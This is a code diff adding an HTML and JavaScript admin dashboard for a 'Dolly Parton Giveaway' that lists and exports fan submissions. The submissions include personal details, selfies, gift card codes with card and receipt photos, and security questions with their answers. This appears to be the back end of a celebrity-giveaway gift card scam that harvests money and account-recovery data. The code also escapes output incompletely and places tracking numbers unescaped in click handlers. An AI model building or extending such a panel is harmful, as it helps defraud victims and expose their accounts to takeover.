@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dolly Parton Giveaway - Admin Dashboard</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #c62828, #f9a825);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        
+        .back-link {
+            display: inline-block;
+            margin-top: 15px;
+            color: white;
+            text-decoration: none;
+            background: rgba(255,255,255,0.2);
+            padding: 8px 20px;
+            border-radius: 25px;
+            transition: all 0.3s;
+        }
+        
+        .back-link:hover {
+            background: rgba(255,255,255,0.3);
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            padding: 30px;
+            background: #f8f9fa;
+        }
+        
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #c62828;
+        }
+        
+        .stat-label {
+            color: #666;
+            margin-top: 10px;
+        }
+        
+        .controls {
+            padding: 20px 30px;
+            background: white;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .search-box {
+            padding: 10px 15px;
+            border: 2px solid #ddd;
+            border-radius: 25px;
+            width: 300px;
+            font-size: 1rem;
+        }
+        
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .btn-primary {
+            background: #c62828;
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #8b0000;
+        }
+        
+        .btn-secondary {
+            background: #6c757d;
+            color: white;
+        }
+        
+        .submissions-list {
+            padding: 30px;
+            max-height: 600px;
+            overflow-y: auto;
+        }
+        
+        .submission-card {
+            background: white;
+            border: 1px solid #e0e0e0;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            padding: 20px;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        
+        .submission-card:hover {
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            transform: translateY(-2px);
+        }
+        
+        .submission-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .tracking-number {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #c62828;
+            font-family: monospace;
+        }
+        
+        .submission-date {
+            color: #999;
+            font-size: 0.9rem;
+        }
+        
+        .submission-details {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }
+        
+        .detail-item {
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 10px;
+        }
+        
+        .detail-label {
+            font-weight: bold;
+            color: #555;
+            font-size: 0.85rem;
+            margin-bottom: 5px;
+        }
+        
+        .detail-value {
+            color: #333;
+            word-break: break-word;
+        }
+        
+        .image-thumbnails {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .thumbnail {
+            width: 100px;
+            height: 100px;
+            object-fit: cover;
+            border-radius: 10px;
+            cursor: pointer;
+            border: 2px solid #ddd;
+            transition: all 0.3s;
+            background: #f0f0f0;
+        }
+        
+        .thumbnail:hover {
+            border-color: #c62828;
+            transform: scale(1.05);
+        }
+        
+        .thumbnail-error {
+            width: 100px;
+            height: 100px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #999;
+            font-size: 12px;
+            text-align: center;
+            border: 2px solid #ddd;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal img {
+            max-width: 90%;
+            max-height: 90%;
+            border-radius: 10px;
+        }
+        
+        .modal-close {
+            position: absolute;
+            top: 20px;
+            right: 40px;
+            color: white;
+            font-size: 40px;
+            cursor: pointer;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 50px;
+            font-size: 1.2rem;
+            color: #666;
+        }
+        
+        .no-data {
+            text-align: center;
+            padding: 50px;
+            color: #999;
+            font-size: 1.2rem;
+        }
+        
+        .more-details {
+            margin-top: 15px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            display: none;
+        }
+        
+        .more-details.show {
+            display: block;
+        }
+        
+        @media (max-width: 768px) {
+            .controls {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            
+            .search-box {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎤 Dolly Parton Giveaway Admin Dashboard</h1>
+            <p>Manage and view all fan submissions</p>
+            <a href="/" class="back-link">← Back to Giveaway Form</a>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number" id="totalSubmissions">0</div>
+                <div class="stat-label">Total Submissions</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="totalImages">0</div>
+                <div class="stat-label">Total Images Uploaded</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="totalGiftCards">0</div>
+                <div class="stat-label">Gift Cards Received</div>
+            </div>
+        </div>
+        
+        <div class="controls">
+            <input type="text" class="search-box" placeholder="Search by name, email, or tracking..." id="searchInput">
+            <div>
+                <button class="btn btn-primary" onclick="refreshData()">🔄 Refresh</button>
+                <button class="btn btn-secondary" onclick="exportToCSV()">📊 Export to CSV</button>
+            </div>
+        </div>
+        
+        <div class="submissions-list" id="submissionsList">
+            <div class="loading">Loading submissions...</div>
+        </div>
+    </div>
+    
+    <div class="modal" id="imageModal" onclick="closeModal()">
+        <span class="modal-close">&times;</span>
+        <img id="modalImage" src="">
+    </div>
+    
+    <script>
+        let allSubmissions = [];
+        
+        // Helper function to fix image path
+        function fixImagePath(path) {
+            if (!path) return null;
+            // Remove the full absolute path and keep only the relative path
+            let relativePath = path.replace(/^.*?\/uploads\//, '/uploads/');
+            // Also handle Windows paths
+            relativePath = relativePath.replace(/\\/g, '/');
+            return relativePath;
+        }
+        
+        async function refreshData() {
+            try {
+                const response = await fetch('/api/submissions');
+                const data = await response.json();
+                
+                if (Array.isArray(data)) {
+                    allSubmissions = data;
+                    displaySubmissions(allSubmissions);
+                    updateStats(allSubmissions);
+                } else {
+                    console.log('No submissions data found');
+                    allSubmissions = [];
+                    displaySubmissions([]);
+                    updateStats([]);
+                }
+            } catch (error) {
+                console.error('Error loading submissions:', error);
+                document.getElementById('submissionsList').innerHTML = '<div class="no-data">❌ Error loading submissions. Make sure the server is running at http://localhost:3001</div>';
+            }
+        }
+        
+        function updateStats(submissions) {
+            document.getElementById('totalSubmissions').textContent = submissions.length;
+            
+            let totalImages = 0;
+            let totalGiftCards = 0;
+            
+            submissions.forEach(sub => {
+                if (sub.mediaFiles) {
+                    if (sub.mediaFiles.selfieCamera) totalImages++;
+                    if (sub.mediaFiles.selfieUpload) totalImages++;
+                }
+                if (sub.giftCard) {
+                    if (sub.giftCard.cardImage) {
+                        totalImages++;
+                        totalGiftCards++;
+                    }
+                    if (sub.giftCard.receiptImage) totalImages++;
+                }
+            });
+            
+            document.getElementById('totalImages').textContent = totalImages;
+            document.getElementById('totalGiftCards').textContent = totalGiftCards;
+        }
+        
+        function displaySubmissions(submissions) {
+            const container = document.getElementById('submissionsList');
+            
+            if (submissions.length === 0) {
+                container.innerHTML = '<div class="no-data">📭 No submissions yet. Share the form to get entries!</div>';
+                return;
+            }
+            
+            container.innerHTML = submissions.map(sub => `
+                <div class="submission-card" onclick="toggleDetails('${sub.trackingNumber}')">
+                    <div class="submission-header">
+                        <div class="tracking-number">🎯 ${sub.trackingNumber || 'N/A'}</div>
+                        <div class="submission-date">📅 ${new Date(sub.submissionDate).toLocaleString()}</div>
+                    </div>
+                    <div class="submission-details">
+                        <div class="detail-item">
+                            <div class="detail-label">👤 Full Name</div>
+                            <div class="detail-value">${escapeHtml(sub.personalInfo?.fullname || 'N/A')}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">📧 Email</div>
+                            <div class="detail-value">${escapeHtml(sub.personalInfo?.email || 'N/A')}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">📞 Phone</div>
+                            <div class="detail-value">${escapeHtml(sub.personalInfo?.phone || 'N/A')}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">📍 Shipping Address</div>
+                            <div class="detail-value">${escapeHtml(sub.personalInfo?.shippingAddress || 'N/A')}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">❤️ Fan Since</div>
+                            <div class="detail-value">${escapeHtml(sub.fanInfo?.fanDuration || 'N/A')}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">💳 Gift Card Code</div>
+                            <div class="detail-value">${escapeHtml(sub.giftCard?.code || 'N/A')}</div>
+                        </div>
+                    </div>
+                    <div class="image-thumbnails" id="thumbs-${sub.trackingNumber.replace(/[^a-zA-Z0-9]/g, '-')}">
+                        ${generateThumbnails(sub)}
+                    </div>
+                    <div id="details-${sub.trackingNumber.replace(/[^a-zA-Z0-9]/g, '-')}" class="more-details">
+                        <div class="detail-item">
+                            <div class="detail-label">🎤 What they love about Dolly</div>
+                            <div class="detail-value">${escapeHtml(sub.fanInfo?.loveMessage || 'N/A')}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">🎵 Favorite Memory/Song</div>
+                            <div class="detail-value">${escapeHtml(sub.fanInfo?.favMemory || 'N/A')}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">🔒 Security Q1</div>
+                            <div class="detail-value">${escapeHtml(sub.securityQuestions?.question1 || 'N/A')}<br>
+                            <strong>Answer:</strong> ${escapeHtml(sub.securityQuestions?.answer1 || 'N/A')}</div>
+                        </div>
+                        <div class="detail-item">
+                            <div class="detail-label">🔒 Security Q2</div>
+                            <div class="detail-value">${escapeHtml(sub.securityQuestions?.question2 || 'N/A')}<br>
+                            <strong>Answer:</strong> ${escapeHtml(sub.securityQuestions?.answer2 || 'N/A')}</div>
+                        </div>
+                    </div>
+                    <button class="btn btn-primary" style="margin-top:10px; font-size:0.85rem;" onclick="event.stopPropagation(); toggleDetails('${sub.trackingNumber}')">
+                        📋 Toggle Full Details
+                    </button>
+                </div>
+            `).join('');
+        }
+        
+        function generateThumbnails(sub) {
+            let thumbs = '';
+            
+            // Helper to create thumbnail with error handling
+            function createThumbnail(imgPath, title) {
+                const fixedPath = fixImagePath(imgPath);
+                if (!fixedPath) return '';
+                return `<img class="thumbnail" src="${fixedPath}" onclick="event.stopPropagation(); showImage('${fixedPath}')" title="${title}" onerror="this.onerror=null; this.parentNode.innerHTML='<div class=\'thumbnail-error\'>Image<br>Not Found</div>';">`;
+            }
+            
+            if (sub.mediaFiles?.selfieCamera) {
+                thumbs += createThumbnail(sub.mediaFiles.selfieCamera, 'Selfie (Camera)');
+            }
+            if (sub.mediaFiles?.selfieUpload) {
+                thumbs += createThumbnail(sub.mediaFiles.selfieUpload, 'Selfie (Upload)');
+            }
+            if (sub.giftCard?.cardImage) {
+                thumbs += createThumbnail(sub.giftCard.cardImage, 'Gift Card');
+            }
+            if (sub.giftCard?.receiptImage) {
+                thumbs += createThumbnail(sub.giftCard.receiptImage, 'Receipt');
+            }
+            
+            return thumbs || '<span style="color:#999;">No images uploaded</span>';
+        }
+        
+        function toggleDetails(trackingNumber) {
+            const id = `details-${trackingNumber.replace(/[^a-zA-Z0-9]/g, '-')}`;
+            const elem = document.getElementById(id);
+            if (elem) {
+                elem.classList.toggle('show');
+            }
+        }
+        
+        function showImage(src) {
+            const modal = document.getElementById('imageModal');
+            const modalImg = document.getElementById('modalImage');
+            modal.style.display = 'flex';
+            modalImg.src = src;
+        }
+        
+        function closeModal() {
+            document.getElementById('imageModal').style.display = 'none';
+        }
+        
+        function exportToCSV() {
+            let csv = 'Tracking Number,Date,Name,Email,Phone,Address,Fan Duration,Gift Card Code,Love Message,Favorite Memory,Security Q1,Security Q1 Answer,Security Q2,Security Q2 Answer\n';
+            allSubmissions.forEach(sub => {
+                csv += `"${sub.trackingNumber || ''}","${sub.submissionDate || ''}","${sub.personalInfo?.fullname || ''}","${sub.personalInfo?.email || ''}","${sub.personalInfo?.phone || ''}","${sub.personalInfo?.shippingAddress || ''}","${sub.fanInfo?.fanDuration || ''}","${sub.giftCard?.code || ''}","${sub.fanInfo?.loveMessage || ''}","${sub.fanInfo?.favMemory || ''}","${sub.securityQuestions?.question1 || ''}","${sub.securityQuestions?.answer1 || ''}","${sub.securityQuestions?.question2 || ''}","${sub.securityQuestions?.answer2 || ''}"\n`;
+            });
+            
+            const blob = new Blob([csv], { type: 'text/csv' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `dolly-giveaway-submissions-${new Date().toISOString().split('T')[0]}.csv`;
+            a.click();
+            window.URL.revokeObjectURL(url);
+        }
+        
+        function escapeHtml(str) {
+            if (!str) return '';
+            return str.replace(/[&<>]/g, function(m) {
+                if (m === '&') return '&amp;';
+                if (m === '<') return '&lt;';
+                if (m === '>') return '&gt;';
+                return m;
+            });
+        }
+        
+        // Search functionality
+        document.getElementById('searchInput').addEventListener('input', (e) => {
+            const searchTerm = e.target.value.toLowerCase();
+            const filtered = allSubmissions.filter(sub => 
+                sub.personalInfo?.fullname?.toLowerCase().includes(searchTerm) ||
+                sub.personalInfo?.email?.toLowerCase().includes(searchTerm) ||
+                sub.trackingNumber?.toLowerCase().includes(searchTerm)
+            );
+            displaySubmissions(filtered);
+        });
+        
+        // Auto-refresh every 30 seconds
+        refreshData();
+        setInterval(refreshData, 30000);
+    </script>
+</body>
+</html>
